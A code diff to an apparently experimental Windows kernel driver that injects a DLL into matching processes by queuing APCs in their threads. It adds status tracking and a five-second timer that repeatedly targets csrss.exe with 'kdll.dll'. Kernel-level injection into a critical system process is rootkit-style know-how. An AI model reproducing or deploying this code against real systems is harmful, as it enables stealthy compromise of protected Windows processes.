@@ -197,7 +197,7 @@ NTSTATUS
 }
 
 NTSTATUS
-	InjectDllProcess(HANDLE ProcessHandle, PEPROCESS Process, PSYSTEM_PROCESS_INFORMATION ProcInfo, ULONG_PTR ProcInfoBarrier, PUNICODE_STRING DllPath, PUNICODE_STRING DllName)
+	InjectDllProcess(PPROCESS_ENTRY Entry, HANDLE ProcessHandle, PEPROCESS Process, PSYSTEM_PROCESS_INFORMATION ProcInfo, ULONG_PTR ProcInfoBarrier, PUNICODE_STRING DllPath, PUNICODE_STRING DllName)
 {
 
 	NTSTATUS Status;
@@ -212,8 +212,10 @@ NTSTATUS
 
 	Status = InjectProcessAllocateCode(ProcessHandle, &pStubData, &pStubSize);
 	if (!NT_SUCCESS(Status)) {
+		Entry->InjectInfo.InjectStatus = Status;
 		return Status;
 	}
+	Entry->InjectInfo.pStubData = pStubData;
 
 	KLog(LInfo, "pStubCode=%p, pStubSize=%x", pStubData, pStubSize);
 
@@ -224,6 +226,8 @@ NTSTATUS
 	if (!NT_SUCCESS(Status)) {
 		goto free_mem;
 	}
+	
+	Entry->InjectInfo.StubSetup = TRUE;
 
 	PSYSTEM_THREAD_INFORMATION ThreadInfo = (PSYSTEM_THREAD_INFORMATION)((ULONG_PTR)ProcInfo + sizeof(SYSTEM_PROCESS_INFORMATION));
 
@@ -256,6 +260,8 @@ _next_thread:
 		ThreadInfo = (PSYSTEM_THREAD_INFORMATION)((ULONG_PTR)ThreadInfo + sizeof(SYSTEM_THREAD_INFORMATION));
 	}
 
+	Entry->InjectInfo.ThreadApcQueuedCount = InjectedCount;
+
 	KLog(LInfo, "InjectedCount=%x", InjectedCount);
 	if (InjectedCount > 0) {
 		LARGE_INTEGER Timeout;
@@ -267,11 +273,12 @@ _next_thread:
 		KeStackAttachProcess(Process, &ApcState);
 		Status = (pStubData->Inited) ? STATUS_SUCCESS : STATUS_UNSUCCESSFUL;
 		KeUnstackDetachProcess(&ApcState);
-		if (NT_SUCCESS(Status))
+		if (NT_SUCCESS(Status)) {
+			Entry->InjectInfo.StubCalled = TRUE;
 			KLog(LInfo, "Injection SUCCESS for proc=%p", Process);
-
-		return Status;
+		}
 	} else {
+		Status = STATUS_UNSUCCESSFUL;
 free_mem:
 		pStubSize = 0;
 		Status = ZwFreeVirtualMemory(ProcessHandle, &pStubData, &pStubSize, MEM_RELEASE);
@@ -280,7 +287,8 @@ free_mem:
 		}
 	}
 
-	return STATUS_UNSUCCESSFUL;
+	Entry->InjectInfo.InjectStatus = Status;
+	return Status;
 }
 
 NTSTATUS
@@ -302,7 +310,7 @@ NTSTATUS
 
 	while (TRUE) {
 		Status = ZwQuerySystemInformation(SystemProcessInformation, Info, InfoLength, &ReqLength);
-		KLog(LInfo, "ZwQuerySystemInformation status=%x, infolen=%x, reqLen=%x", Status, InfoLength, ReqLength);
+		//KLog(LInfo, "ZwQuerySystemInformation status=%x, infolen=%x, reqLen=%x", Status, InfoLength, ReqLength);
 		if ((Status == STATUS_BUFFER_TOO_SMALL) || (Status == STATUS_INFO_LENGTH_MISMATCH)) {
 			ExFreePool(Info);
 			InfoLength = ReqLength + 100 * sizeof(SYSTEM_PROCESS_INFORMATION);
@@ -340,6 +348,7 @@ NTSTATUS
 	UNICODE_STRING ProcessPrefixSz = { 0, 0, NULL };
 	HANDLE ProcessHandle = NULL;
 	BOOLEAN bProcAcquired = FALSE;
+	PPROCESS_ENTRY Entry = NULL;
 
 	Status = SeLocateProcessImageName(Process, &pImageFileName);
 	if (!NT_SUCCESS(Status)) {
@@ -347,7 +356,7 @@ NTSTATUS
 		return Status;
 	}
 
-	KLog(LInfo, "Proc=%p name is %wZ", Process, pImageFileName);
+//	KLog(LInfo, "Proc=%p name is %wZ", Process, pImageFileName);
 	if (pImageFileName->Buffer == NULL || pImageFileName->Length == 0) {
 		KLog(LError, "Empty process name for proc=%p", Process);
 		goto cleanup;
@@ -371,7 +380,11 @@ NTSTATUS
 	if (wcsstr(ImageFileNameSz.Buffer, ProcessPrefixSz.Buffer) == NULL)
 		goto cleanup;
 
-	KLog(LInfo, "Found match process name=%wZ, prefix=%wZ", &ImageFileNameSz, &ProcessPrefixSz);
+	KLog(LInfo, "Found match process name=%wZ, prefix=%wZ, numThread=%d", &ImageFileNameSz, &ProcessPrefixSz, ProcInfo->NumberOfThreads);
+
+	if (ProcInfo->NumberOfThreads < 5)
+		goto cleanup;
+
 	Status = PsAcquireProcessExitSynchronization(Process);
 	if (!NT_SUCCESS(Status)) {
 		KLog(LError, "Cant acquire process=%p, name=%wZ, error=%x", Process, &ImageFileNameSz, Status);
@@ -385,12 +398,22 @@ NTSTATUS
 		goto cleanup;
 	}
 
-	Status = InjectDllProcess(ProcessHandle, Process, ProcInfo, ProcInfoBarrier, DllPath, DllName);
+	Entry = ProcessEntryCreate(&MonitorGetInstance()->ProcessTable, Process);
+	if (Entry == NULL) {
+		KLog(LInfo, "Process=%p already injected", Process);
+		Status = STATUS_SUCCESS;
+		goto cleanup;
+	}
+
+	Status = InjectDllProcess(Entry, ProcessHandle, Process, ProcInfo, ProcInfoBarrier, DllPath, DllName);
 	if (!NT_SUCCESS(Status)) {
 		KLog(LError, "Can't inject dll for process=%p, name=%wZ, error=%x", Process, &ImageFileNameSz, Status);
 	}
-
+	
 cleanup:
+	if (Entry != NULL)
+		ProcessEntryDeref(Entry);
+
 	if (ProcessHandle != NULL)
 		ZwClose(ProcessHandle);
 
@@ -431,7 +454,7 @@ NTSTATUS
 			KLog(LError, "lookup for pid=%p failed error=%x", CurrProcInfo->UniqueProcessId, Status);
 			goto _next_process;
 		}
-		KLog(LInfo, "found proc %p by pid=%p", Process, CurrProcInfo->UniqueProcessId);
+//		KLog(LInfo, "found proc %p by pid=%p", Process, CurrProcInfo->UniqueProcessId);
 
 		Status = InjectCheckProcessAndInjectDll(Process, CurrProcInfo, ProcInfoBarrier, ProcessPrefix, DllPath, DllName);
 		if (!NT_SUCCESS(Status)) {
@@ -457,4 +480,84 @@ _next_process:
 		ExFreePool(ProcInfo);
 
 	return STATUS_SUCCESS;
+}
+
+
+NTSTATUS InjectDllWorker(PINJECT_BLOCK Inject)
+{
+
+	UNICODE_STRING ProcPrefix = RTL_CONSTANT_STRING(L"csrss.exe");
+	UNICODE_STRING DllPath = RTL_CONSTANT_STRING(L"\\\\?\\C:\\test");
+	UNICODE_STRING DllName = RTL_CONSTANT_STRING(L"kdll.dll");
+
+	return InjectFindAllProcessesAndInjectDll(&ProcPrefix, &DllPath, &DllName);
+}
+
+
+VOID NTAPI
+InjectTimerDpcRoutine(
+_In_      struct _KDPC *Dpc,
+_In_opt_  PVOID DeferredContext,
+_In_opt_  PVOID SystemArgument1,
+_In_opt_  PVOID SystemArgument2
+)
+{
+	PINJECT_BLOCK Inject = (PINJECT_BLOCK)DeferredContext;
+
+	SysWorkerAddWork(&Inject->Worker, InjectDllWorker, Inject);
+}
+
+VOID
+	InjectInit(PINJECT_BLOCK Inject)
+{
+	KeInitializeTimer(&Inject->Timer);
+	KeInitializeDpc(&Inject->TimerDpc, InjectTimerDpcRoutine, Inject);
+	SysWorkerInit(&Inject->Worker);
+}
+
+NTSTATUS
+	InjectStart(PINJECT_BLOCK Inject)
+{
+	NTSTATUS Status;
+	LARGE_INTEGER TimerDueTime;
+
+	Status = SysWorkerStart(&Inject->Worker);
+	if (!NT_SUCCESS(Status)) {
+		goto start_failed;
+	}
+
+	TimerDueTime.QuadPart = 0;
+	KeSetTimerEx(&Inject->Timer, TimerDueTime, 5000, &Inject->TimerDpc);
+	return STATUS_SUCCESS;
+
+start_failed:
+	KeCancelTimer(&Inject->Timer);
+	KeFlushQueuedDpcs();
+	SysWorkerStop(&Inject->Worker);
+
+	return Status;
+}
+
+NTSTATUS
+	InjectEmptyWork(PINJECT_BLOCK Inject)
+{
+	return STATUS_SUCCESS;
+}
+
+VOID
+	InjectStop(PINJECT_BLOCK Inject)
+{
+	PSYS_WRK_ITEM WrkItem = NULL;
+
+	KeCancelTimer(&Inject->Timer);
+	KeFlushQueuedDpcs();
+
+
+	WrkItem = SysWorkerAddWorkRef(&Inject->Worker, InjectEmptyWork, Inject);
+	if (WrkItem != NULL) {
+		KeWaitForSingleObject(&WrkItem->CompletionEvent, Executive, KernelMode, FALSE, NULL);
+		SysWrkItemDeref(WrkItem);
+	}
+
+	SysWorkerStop(&Inject->Worker);
 }
